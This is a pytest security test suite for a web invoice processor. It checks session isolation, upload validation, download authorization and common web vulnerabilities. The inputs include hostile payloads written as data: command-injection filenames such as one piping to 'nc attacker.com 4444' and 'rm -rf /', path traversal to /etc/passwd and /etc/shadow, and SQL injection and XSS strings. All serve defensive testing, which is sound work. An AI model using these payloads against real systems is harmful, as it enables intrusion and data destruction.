"""
Security and access control testing for the web invoice processor
Tests session-based access control, file upload security, download authorization, and common web vulnerabilities
"""
import base64
import hashlib
import json
import os
import random
import string
import time
import uuid
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import pytest
import requests
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from io import BytesIO


class SecurityTestClient:
    """Enhanced client for security testing"""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session_id: Optional[str] = None
    
    def create_session(self) -> str:
        """Create a new session"""
        response = self.session.post(f"{self.base_url}/api/session")
        response.raise_for_status()
        data = response.json()
        self.session_id = data["session_id"]
        self.session.headers.update({"X-Session-ID": self.session_id})
        return self.session_id
    
    def raw_request(self, method: str, endpoint: str, **kwargs) -> requests.Response:
        """Make raw request without automatic session headers"""
        url = f"{self.base_url}{endpoint}"
        return requests.request(method, url, **kwargs)
    
    def upload_file_raw(self, files, headers: Optional[Dict] = None) -> requests.Response:
        """Upload file with raw response (no exception raising)"""
        return self.session.post(
            f"{self.base_url}/api/upload",
            files=files,
            headers=headers or {}
        )
    
    def get_task_status_raw(self, task_id: str, headers: Optional[Dict] = None) -> requests.Response:
        """Get task status with raw response"""
        return self.session.get(
            f"{self.base_url}/api/task/{task_id}/status",
            headers=headers or {}
        )
    
    def download_file_raw(self, task_id: str, filename: str, headers: Optional[Dict] = None) -> requests.Response:
        """Download file with raw response"""
        return self.session.get(
            f"{self.base_url}/api/download/{task_id}/{filename}",
            headers=headers or {}
        )


def create_test_pdf(filename: str, content: str = "Test PDF") -> bytes:
    """Create a simple test PDF"""
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    c.drawString(100, 750, content)
    c.drawString(100, 730, f"Filename: {filename}")
    c.save()
    buffer.seek(0)
    return buffer.read()


def generate_random_string(length: int) -> str:
    """Generate random string for testing"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


class TestSessionBasedAccessControl:
    """Test session-based access control mechanisms"""
    
    def test_session_creation_and_validation(self):
        """Test session creation and validation"""
        client = SecurityTestClient()
        
        # Test session creation
        session_id = client.create_session()
        assert session_id
        assert len(session_id) == 36  # UUID format
        
        # Test session validation with valid session
        response = client.raw_request("GET", "/api/health", headers={"X-Session-ID": session_id})
        assert response.status_code == 200
        
        # Test session validation with invalid session
        invalid_session = str(uuid.uuid4())
        response = client.raw_request("GET", f"/api/task/{uuid.uuid4()}/status", 
                                    headers={"X-Session-ID": invalid_session})
        assert response.status_code in [401, 404]  # Either unauthorized or not found
    
    def test_missing_session_header(self):
        """Test requests without session headers are rejected"""
        client = SecurityTestClient()
        
        # Test upload without session header
        pdf_content = create_test_pdf("test.pdf")
        files = [("files", ("test.pdf", pdf_content, "application/pdf"))]
        response = client.raw_request("POST", "/api/upload", files=files)
        assert response.status_code == 400
        
        error_data = response.json()
        assert error_data.get("error") is True
        assert "session" in error_data.get("message", "").lower()
        
        # Test task status without session header
        response = client.raw_request("GET", f"/api/task/{uuid.uuid4()}/status")
        assert response.status_code == 400
        
        # Test download without session header
        response = client.raw_request("GET", f"/api/download/{uuid.uuid4()}/test.pdf")
        assert response.status_code == 400
    
    def test_session_isolation(self):
        """Test that sessions cannot access each other's resources"""
        # Create two separate sessions
        client1 = SecurityTestClient()
        client2 = SecurityTestClient()
        
        session1_id = client1.create_session()
        session2_id = client2.create_session()
        
        assert session1_id != session2_id
        
        # Upload file in session 1
        pdf_content = create_test_pdf("session1_file.pdf", "Session 1 Content")
        files = [("files", ("session1_file.pdf", pdf_content, "application/pdf"))]
        upload_response = client1.upload_file_raw(files)
        assert upload_response.status_code == 200
        
        upload_data = upload_response.json()
        task_id = upload_data["taskId"]
        
        # Try to access session 1's task from session 2
        response = client2.get_task_status_raw(task_id)
        assert response.status_code in [401, 403, 404]  # Should be denied
        
        # Verify session 1 can still access its own task
        response = client1.get_task_status_raw(task_id)
        assert response.status_code == 200
    
    def test_session_hijacking_protection(self):
        """Test protection against session hijacking attempts"""
        client = SecurityTestClient()
        session_id = client.create_session()
        
        # Test with modified session ID
        modified_sessions = [
            session_id[:-1] + "x",  # Change last character
            session_id.upper(),     # Change case
            session_id + "extra",   # Add extra characters
            session_id[1:],         # Remove first character
            ""                      # Empty session
        ]
        
        for modified_session in modified_sessions:
            response = client.raw_request(
                "GET", f"/api/task/{uuid.uuid4()}/status",
                headers={"X-Session-ID": modified_session}
            )
            assert response.status_code in [400, 401], f"Modified session {modified_session} should be rejected"
    
    def test_concurrent_session_access(self):
        """Test concurrent access from same session"""
        client = SecurityTestClient()
        session_id = client.create_session()
        
        # Create multiple clients with same session ID
        clients = []
        for i in range(3):
            new_client = SecurityTestClient()
            new_client.session_id = session_id
            new_client.session.headers.update({"X-Session-ID": session_id})
            clients.append(new_client)
        
        # Upload files from different clients with same session
        task_ids = []
        for i, client in enumerate(clients):
            pdf_content = create_test_pdf(f"concurrent_{i}.pdf", f"Concurrent test {i}")
            files = [("files", (f"concurrent_{i}.pdf", pdf_content, "application/pdf"))]
            response = client.upload_file_raw(files)
            assert response.status_code == 200
            task_ids.append(response.json()["taskId"])
        
        # Verify all clients can access all tasks from the same session
        for client in clients:
            for task_id in task_ids:
                response = client.get_task_status_raw(task_id)
                assert response.status_code == 200


class TestFileUploadSecurity:
    """Test file upload security measures"""
    
    def test_file_type_validation(self):
        """Test file type validation and rejection of invalid types"""
        client = SecurityTestClient()
        client.create_session()
        
        # Test valid file types
        valid_files = [
            ("test.pdf", create_test_pdf("test.pdf"), "application/pdf"),
            ("test.PDF", create_test_pdf("test.PDF"), "application/pdf"),  # Case insensitive
        ]
        
        for filename, content, content_type in valid_files:
            files = [("files", (filename, content, content_type))]
            response = client.upload_file_raw(files)
            assert response.status_code == 200, f"Valid file {filename} should be accepted"
        
        # Test invalid file types
        invalid_files = [
            ("test.txt", b"This is a text file", "text/plain"),
            ("test.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("test.js", b"alert('xss')", "application/javascript"),
            ("test.html", b"<script>alert('xss')</script>", "text/html"),
            ("test.php", b"<?php echo 'hello'; ?>", "application/x-php"),
            ("test.py", b"import os; os.system('rm -rf /')", "text/x-python"),
        ]
        
        for filename, content, content_type in invalid_files:
            files = [("files", (filename, content, content_type))]
            response = client.upload_file_raw(files)
            assert response.status_code in [400, 422], f"Invalid file {filename} should be rejected"
    
    def test_file_size_limits(self):
        """Test file size validation"""
        client = SecurityTestClient()
        client.create_session()
        
        # Test normal size file
        normal_pdf = create_test_pdf("normal.pdf", "Normal size content")
        files = [("files", ("normal.pdf", normal_pdf, "application/pdf"))]
        response = client.upload_file_raw(files)
        assert response.status_code == 200
        
        # Test oversized file (create large content)
        large_content = b"A" * (60 * 1024 * 1024)  # 60MB (assuming 50MB limit)
        files = [("files", ("large.pdf", large_content, "application/pdf"))]
        response = client.upload_file_raw(files)
        assert response.status_code in [400, 413, 422], "Oversized file should be rejected"
        
        if response.status_code in [400, 422]:
            error_data = response.json()
            assert "size" in error_data.get("message", "").lower()
    
    def test_malicious_filename_handling(self):
        """Test handling of malicious filenames"""
        client = SecurityTestClient()
        client.create_session()
        
        pdf_content = create_test_pdf("test.pdf")
        
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "test.pdf; rm -rf /",
            "test.pdf && cat /etc/passwd",
            "test.pdf | nc attacker.com 4444",
            "<script>alert('xss')</script>.pdf",
            "test\x00.pdf",  # Null byte injection
            "test.pdf\r\n\r\nHTTP/1.1 200 OK",  # HTTP response splitting
            "a" * 1000 + ".pdf",  # Very long filename
        ]
        
        for malicious_filename in malicious_filenames:
            files = [("files", (malicious_filename, pdf_content, "application/pdf"))]
            response = client.upload_file_raw(files)
            
            # Should either reject the filename or sanitize it
            if response.status_code == 200:
                # If accepted, verify the filename was sanitized
                data = response.json()
                # The system should have sanitized the filename
                assert "taskId" in data
            else:
                # Rejection is also acceptable
                assert response.status_code in [400, 422]
    
    def test_file_content_validation(self):
        """Test validation of file content vs declared type"""
        client = SecurityTestClient()
        client.create_session()
        
        # Test files with mismatched content and declared type
        mismatched_files = [
            ("fake.pdf", b"This is not a PDF", "application/pdf"),
            ("fake.pdf", b"<html><body>HTML content</body></html>", "application/pdf"),
            ("fake.pdf", b"\x89PNG\r\n\x1a\n", "application/pdf"),  # PNG header
            ("fake.pdf", b"PK\x03\x04", "application/pdf"),  # ZIP header
        ]
        
        for filename, content, content_type in mismatched_files:
            files = [("files", (filename, content, content_type))]
            response = client.upload_file_raw(files)
            
            # Should either reject immediately or fail during processing
            if response.status_code == 200:
                # If upload succeeds, processing should fail
                data = response.json()
                task_id = data["taskId"]
                
                # Wait a bit and check if processing failed
                time.sleep(5)
                status_response = client.get_task_status_raw(task_id)
                if status_response.status_code == 200:
                    status_data = status_response.json()
                    # Should eventually fail during processing
                    assert status_data["status"] in ["failed", "processing", "queued"]
            else:
                # Immediate rejection is also acceptable
                assert response.status_code in [400, 422]
    
    def test_zip_bomb_protection(self):
        """Test protection against ZIP bomb attacks"""
        client = SecurityTestClient()
        client.create_session()
        
        # Create a ZIP file with high compression ratio (potential zip bomb)
        import zipfile
        from io import BytesIO
        
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Add a file with repetitive content that compresses well
            large_content = b"A" * (1024 * 1024)  # 1MB of 'A's
            zip_file.writestr("large_file.txt", large_content)
        
        zip_buffer.seek(0)
        zip_content = zip_buffer.read()
        
        files = [("files", ("potential_bomb.zip", zip_content, "application/zip"))]
        response = client.upload_file_raw(files)
        
        # System should either reject ZIP files or handle them safely
        if response.status_code == 200:
            # If accepted, processing should handle it safely without consuming excessive resources
            data = response.json()
            task_id = data["taskId"]
            
            # Monitor for reasonable completion time
            start_time = time.time()
            while time.time() - start_time < 30:  # 30 second timeout
                status_response = client.get_task_status_raw(task_id)
                if status_response.status_code == 200:
                    status_data = status_response.json()
                    if status_data["status"] in ["completed", "failed"]:
                        break
                time.sleep(2)
            
            # Should complete or fail within reasonable time
            assert time.time() - start_time < 30, "ZIP processing took too long (potential zip bomb)"


class TestDownloadAuthorization:
    """Test download authorization and access control"""
    
    def test_download_session_verification(self):
        """Test that downloads require proper session authorization"""
        # Create two sessions
        client1 = SecurityTestClient()
        client2 = SecurityTestClient()
        
        session1_id = client1.create_session()
        session2_id = client2.create_session()
        
        # Upload file in session 1
        pdf_content = create_test_pdf("download_test.pdf", "Download test content")
        files = [("files", ("download_test.pdf", pdf_content, "application/pdf"))]
        upload_response = client1.upload_file_raw(files)
        assert upload_response.status_code == 200
        
        upload_data = upload_response.json()
        task_id = upload_data["taskId"]
        
        # Wait for processing to complete
        for _ in range(30):  # 30 second timeout
            status_response = client1.get_task_status_raw(task_id)
            if status_response.status_code == 200:
                status_data = status_response.json()
                if status_data["status"] == "completed":
                    download_urls = status_data.get("downloadUrls", [])
                    if download_urls:
                        filename = download_urls[0].split("/")[-1]
                        break
                elif status_data["status"] == "failed":
                    pytest.skip("File processing failed")
            time.sleep(1)
        else:
            pytest.skip("File processing did not complete in time")
        
        # Test download with correct session
        download_response = client1.download_file_raw(task_id, filename)
        assert download_response.status_code == 200
        assert len(download_response.content) > 0
        
        # Test download with wrong session
        download_response = client2.download_file_raw(task_id, filename)
        assert download_response.status_code in [401, 403, 404]
        
        # Test download without session
        response = client1.raw_request("GET", f"/api/download/{task_id}/{filename}")
        assert response.status_code == 400  # Missing session header
    
    def test_download_path_traversal_protection(self):
        """Test protection against path traversal attacks in downloads"""
        client = SecurityTestClient()
        client.create_session()
        
        # Upload a legitimate file first
        pdf_content = create_test_pdf("legitimate.pdf")
        files = [("files", ("legitimate.pdf", pdf_content, "application/pdf"))]
        upload_response = client.upload_file_raw(files)
        assert upload_response.status_code == 200
        
        task_id = upload_response.json()["taskId"]
        
        # Test path traversal attempts
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "legitimate.pdf/../../../etc/passwd",
            "legitimate.pdf\\..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc/passwd",
            "legitimate.pdf\x00../../../etc/passwd",  # Null byte injection
        ]
        
        for malicious_path in path_traversal_attempts:
            response = client.download_file_raw(task_id, malicious_path)
            assert response.status_code in [400, 404], f"Path traversal attempt should be blocked: {malicious_path}"
            
            # Ensure we don't get system files
            if response.status_code == 200:
                content = response.content.decode('utf-8', errors='ignore')
                assert "root:" not in content, "System file content detected"
                assert "password" not in content.lower(), "Sensitive content detected"
    
    def test_download_url_expiration(self):
        """Test download URL expiration handling"""
        client = SecurityTestClient()
        client.create_session()
        
        # Upload and process file
        pdf_content = create_test_pdf("expiration_test.pdf")
        files = [("files", ("expiration_test.pdf", pdf_content, "application/pdf"))]
        upload_response = client.upload_file_raw(files)
        assert upload_response.status_code == 200
        
        task_id = upload_response.json()["taskId"]
        
        # Wait for completion
        for _ in range(30):
            status_response = client.get_task_status_raw(task_id)
            if status_response.status_code == 200:
                status_data = status_response.json()
                if status_data["status"] == "completed":
                    download_urls = status_data.get("downloadUrls", [])
                    if download_urls:
                        filename = download_urls[0].split("/")[-1]
                        break
                elif status_data["status"] == "failed":
                    pytest.skip("File processing failed")
            time.sleep(1)
        else:
            pytest.skip("File processing did not complete")
        
        # Test immediate download (should work)
        download_response = client.download_file_raw(task_id, filename)
        assert download_response.status_code == 200
        
        # Test download with expired/invalid task ID
        fake_task_id = str(uuid.uuid4())
        download_response = client.download_file_raw(fake_task_id, filename)
        assert download_response.status_code in [404, 403]
    
    def test_download_file_integrity(self):
        """Test that downloaded files maintain integrity"""
        client = SecurityTestClient()
        client.create_session()
        
        # Create file with known content
        original_content = "File integrity test content"
        pdf_content = create_test_pdf("integrity_test.pdf", original_content)
        original_hash = hashlib.sha256(pdf_content).hexdigest()
        
        files = [("files", ("integrity_test.pdf", pdf_content, "application/pdf"))]
        upload_response = client.upload_file_raw(files)
        assert upload_response.status_code == 200
        
        task_id = upload_response.json()["taskId"]
        
        # Wait for processing
        for _ in range(30):
            status_response = client.get_task_status_raw(task_id)
            if status_response.status_code == 200:
                status_data = status_response.json()
                if status_data["status"] == "completed":
                    download_urls = status_data.get("downloadUrls", [])
                    if download_urls:
                        filename = download_urls[0].split("/")[-1]
                        break
                elif status_data["status"] == "failed":
                    pytest.skip("File processing failed")
            time.sleep(1)
        else:
            pytest.skip("File processing did not complete")
        
        # Download and verify integrity
        download_response = client.download_file_raw(task_id, filename)
        assert download_response.status_code == 200
        
        downloaded_content = download_response.content
        assert len(downloaded_content) > 0
        
        # Verify it's still a valid PDF
        assert downloaded_content.startswith(b"%PDF"), "Downloaded file is not a valid PDF"
        
        # Verify content headers
        assert "application/pdf" in download_response.headers.get("content-type", "").lower()
        assert "attachment" in download_response.headers.get("content-disposition", "").lower()


class TestCommonWebVulnerabilities:
    """Test against common web vulnerabilities"""
    
    def test_sql_injection_protection(self):
        """Test protection against SQL injection attempts"""
        client = SecurityTestClient()
        client.create_session()
        
        # SQL injection attempts in task ID
        sql_injection_payloads = [
            "'; DROP TABLE tasks; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO tasks VALUES ('malicious'); --",
            "1' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
        ]
        
        for payload in sql_injection_payloads:
            response = client.get_task_status_raw(payload)
            # Should return 400 (bad request) or 404 (not found), not 500 (server error)
            assert response.status_code in [400, 404], f"SQL injection payload caused unexpected response: {payload}"
            
            # Should not return database error messages
            if response.status_code != 404:
                content = response.text.lower()
                assert "sql" not in content, "SQL error message detected"
                assert "database" not in content, "Database error message detected"
                assert "mysql" not in content, "MySQL error message detected"
                assert "postgresql" not in content, "PostgreSQL error message detected"
    
    def test_xss_protection(self):
        """Test protection against Cross-Site Scripting (XSS)"""
        client = SecurityTestClient()
        client.create_session()
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')></iframe>",
        ]
        
        # Test XSS in filenames
        pdf_content = create_test_pdf("test.pdf")
        for payload in xss_payloads:
            filename = f"test{payload}.pdf"
            files = [("files", (filename, pdf_content, "application/pdf"))]
            response = client.upload_file_raw(files)
            
            if response.status_code == 200:
                # If accepted, verify response doesn't contain unescaped payload
                response_text = response.text
                assert payload not in response_text, f"Unescaped XSS payload in response: {payload}"
            else:
                # Rejection is also acceptable
                assert response.status_code in [400, 422]
    
    def test_csrf_protection(self):
        """Test Cross-Site Request Forgery (CSRF) protection"""
        client = SecurityTestClient()
        session_id = client.create_session()
        
        # Test requests with different origins
        malicious_origins = [
            "http://evil.com",
            "https://attacker.example.com",
            "http://localhost:3001",  # Different port
        ]
        
        pdf_content = create_test_pdf("csrf_test.pdf")
        files = [("files", ("csrf_test.pdf", pdf_content, "application/pdf"))]
        
        for origin in malicious_origins:
            headers = {
                "X-Session-ID": session_id,
                "Origin": origin,
                "Referer": f"{origin}/malicious-page"
            }
            
            response = client.raw_request("POST", "/api/upload", files=files, headers=headers)
            
            # CSRF protection should either block the request or validate origin
            # For this test, we'll accept either blocking or allowing with proper CORS
            if response.status_code == 200:
                # If allowed, verify CORS headers are properly set
                cors_origin = response.headers.get("Access-Control-Allow-Origin")
                assert cors_origin != "*" or cors_origin == origin, "Overly permissive CORS policy"
    
    def test_http_header_injection(self):
        """Test protection against HTTP header injection"""
        client = SecurityTestClient()
        client.create_session()
        
        # Header injection attempts
        injection_payloads = [
            "test\r\nX-Injected-Header: malicious",
            "test\nSet-Cookie: admin=true",
            "test\r\n\r\n<script>alert('xss')</script>",
            "test%0d%0aX-Injected-Header:%20malicious",  # URL encoded
        ]
        
        for payload in injection_payloads:
            # Test in session ID
            headers = {"X-Session-ID": payload}
            response = client.raw_request("GET", "/api/health", headers=headers)
            
            # Should reject malformed headers
            assert response.status_code in [400, 401], f"Header injection not blocked: {payload}"
            
            # Verify injected headers are not present in response
            assert "X-Injected-Header" not in response.headers
            assert "Set-Cookie" not in response.headers or "admin=true" not in response.headers.get("Set-Cookie", "")
    
    def test_directory_traversal_protection(self):
        """Test protection against directory traversal in API endpoints"""
        client = SecurityTestClient()
        client.create_session()
        
        # Directory traversal attempts in task IDs
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "test\x00../../../etc/passwd",
        ]
        
        for payload in traversal_payloads:
            # Test in task status endpoint
            response = client.get_task_status_raw(payload)
            assert response.status_code in [400, 404], f"Directory traversal not blocked: {payload}"
            
            # Verify no system file content is returned
            if response.status_code == 200:
                content = response.text.lower()
                assert "root:" not in content, "System file content detected"
                assert "password" not in content, "Sensitive content detected"
    
    def test_information_disclosure_protection(self):
        """Test protection against information disclosure"""
        client = SecurityTestClient()
        
        # Test error responses don't leak sensitive information
        test_endpoints = [
            "/api/task/invalid-uuid/status",
            "/api/download/invalid-uuid/test.pdf",
            "/api/nonexistent-endpoint",
        ]
        
        for endpoint in test_endpoints:
            response = client.raw_request("GET", endpoint)
            
            if response.status_code >= 400:
                error_content = response.text.lower()
                
                # Should not contain sensitive information
                sensitive_patterns = [
                    "traceback",
                    "stack trace",
                    "/app/",
                    "/home/",
                    "redis://",
                    "password",
                    "secret",
                    "token",
                    "database",
                    "connection string",
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern not in error_content, f"Sensitive information disclosed: {pattern} in {endpoint}"
    
    def test_rate_limiting_protection(self):
        """Test rate limiting protection against abuse"""
        client = SecurityTestClient()
        client.create_session()
        
        # Make rapid requests to test rate limiting
        rapid_requests = 50
        success_count = 0
        rate_limited_count = 0
        
        for i in range(rapid_requests):
            response = client.raw_request("GET", "/api/health", 
                                        headers={"X-Session-ID": client.session_id})
            
            if response.status_code == 200:
                success_count += 1
            elif response.status_code == 429:  # Too Many Requests
                rate_limited_count += 1
            
            # Small delay to avoid overwhelming the test
            time.sleep(0.01)
        
        print(f"Rate limiting test: {success_count} successful, {rate_limited_count} rate limited")
        
        # Either all requests succeed (no rate limiting) or some are rate limited
        # Both are acceptable depending on implementation
        assert success_count + rate_limited_count >= rapid_requests * 0.8, "Too many failed requests"


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])